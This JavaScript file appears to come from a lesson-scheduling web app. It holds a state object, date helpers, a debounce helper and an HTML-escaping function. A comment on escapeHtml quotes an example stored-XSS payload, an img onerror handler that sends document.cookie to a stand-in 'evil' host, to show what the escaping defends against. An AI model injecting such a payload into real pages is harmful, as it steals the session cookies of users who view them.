const state = {
  user: null,
  profile: null,
  currentWeekStart: null,
  lessons: [],
  students: [],
  selectedRole: null,
  lessonModal: null,
  placingLesson: null,
  placingStudent: null,
  placingTruant: null
};

function getMonday(date) {
  const d = new Date(date);
  const day = d.getDay();
  const diff = d.getDate() - day + (day === 0 ? -6 : 1);
  d.setDate(diff);
  d.setHours(0, 0, 0, 0);
  return d;
}

function formatDate(date) {
  return date.toISOString().split('T')[0];
}

function formatDateShort(date) {
  return date.toLocaleDateString('ru-RU', { day: 'numeric', month: 'short' });
}

// Small debounce helper. Returns a wrapped fn that delays calling `fn(...args)` until
// `ms` milliseconds have passed without further invocations. Used to throttle search-box
// inputs so we don't re-render the student list on every keystroke for 200+ students.
function debounce(fn, ms) {
  let t = null;
  return function (...args) {
    if (t) clearTimeout(t);
    t = setTimeout(() => { t = null; fn.apply(this, args); }, ms);
  };
}

// HTML-escape any value before interpolating into an `.innerHTML = ...` template string.
// Prevents stored-XSS: a malicious student.first_name like
//   `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`
// would otherwise execute when an admin/teacher opens a list containing it.
// Returns '' for null/undefined so we don't render the literal string «undefined».
function escapeHtml(s) {
  if (s === null || s === undefined) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
